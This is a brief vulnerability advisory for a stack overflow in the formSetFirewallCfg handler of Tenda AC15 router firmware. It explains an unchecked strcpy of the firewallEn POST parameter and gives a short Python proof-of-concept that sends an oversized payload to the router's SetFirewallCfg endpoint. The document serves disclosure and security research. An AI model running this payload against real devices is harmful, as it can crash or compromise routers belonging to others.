## Overview

- Firmware download website: https://www.tendacn.com/us/download/detail-3851.html

## Affected version

AC15V1.0 V15.03.20_multi

## Vulnerability details

The Tenda AC15V1.0 V15.03.20_multi firmware has a stack overflow vulnerability in the `formSetFirewallCfg` function. The `src` variable receives the `firewallEn` parameter from a POST request and is later assigned to the `dest` variable, which is fixed at 4 bytes. However, since the user can control the input of  `firewallEn`, the statement `strcpy(dest, src);` can cause a buffer overflow. The user-provided  `firewallEn` can exceed the capacity of the `dest` array, triggering this security vulnerability.

![image-20240305233936132](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305233936132.png)

![image-20240314172148730](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314172148730.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetFirewallCfg"
payload = b"a"*1000

data = {"firewallEn": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240314172220073](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314172220073.png)
